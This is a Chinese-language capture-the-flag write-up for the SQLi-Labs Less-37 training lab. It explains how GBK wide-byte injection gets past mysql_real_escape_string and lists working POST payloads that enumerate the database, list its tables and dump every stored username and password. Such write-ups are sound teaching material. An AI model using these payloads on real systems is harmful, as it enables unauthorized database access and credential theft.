【SQLi-Labs】Less-37 POST型宽字节与 Real Escape 绕过 Writeup

操作者：何芊宏 | 操作日期：2026.10.27 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 宽字节注入, POST注入, 联合查询

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-37 (POST - Bypass MySQL Real Escape String)
  • 提示：POST 登录框，后端使用 mysql_real_escape_string() 转义，字符集为 GBK。

2. 工具配置与操作环境

本关卡为 POST 请求，需拦截并修改 HTTP 请求体，使用 Burp Suite 的 Repeater 模块进行调试。

3. 核心原理：防御失效与宽字节逃逸

本关卡与 Less-36 原理一致，是 Less-34 与 Less-36 的综合体。后端使用了 mysql_real_escape_string() 函数进行转义。理论上，该函数会检查当前连接字符集，能防御宽字节注入。

漏洞成因：

  1. 开发者使用了 mysql_query("SET NAMES gbk") 而不是 mysql_set_charset('gbk') 来设置字符集。
  2. 这导致 mysql_real_escape_string() 在转义时误以为环境是默认字符集（如 ASCII），于是将单引号 '（0x27）转义为 \'（0x5C 0x27）。
  3. 在 uname 传入 -1%df' 时，底层字节流为 2D 31 DF 5C 27。MySQL 引擎按 GBK 编码解析，将 0xDF 0x5C 组合为汉字，导致单引号 0x27 逃逸，成功闭合语句。

4. 操作步骤与解析

第一步：抓包与探测

在登录框随意输入账号密码，抓取 POST 请求并发送至 Repeater。登录框查询语句为 SELECT username, password FROM users ...，固定为 2 列。

第二步：联合查询爆库名

请求体 Payload：

uname=-1%df' union select 1,database()-- -&passwd=123&submit=Submit

回显现象：页面返回 Your Login name:1，Your Password:security。

第三步：爆表名

请求体 Payload：

uname=-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- -&passwd=123&submit=Submit

回显现象：Your Password:emails,referrers,uagents,users。

第四步：直接脱库

请求体 Payload：

uname=-1%df' union select 1,group_concat(username,0x3a,password) from users-- -&passwd=123&submit=Submit

回显现象：页面在 Password 处打印出所有用户的明文账号密码，如 Dumb:Dumb,Angelina:I-kill-you...。

5. 踩坑记录与复盘

  • 编码陷阱：在 Burp 的 Raw 面板直接发送 %df 原始字节，严禁二次 URL 编码。
  • 列数严格匹配：原查询固定 2 列，UNION SELECT 必须凑齐 2 列，否则报错。
  • 注释符：POST 环境中，-- -（注意末尾空格）或 # 均可有效截断原语句尾部。

6. 知识点总结

  • POST 宽字节注入：结合抓包工具，在请求体中注入高位字节绕过转义。
  • 环境错位漏洞：SET NAMES 与 mysql_set_charset 的区别导致的高级防御函数失效。
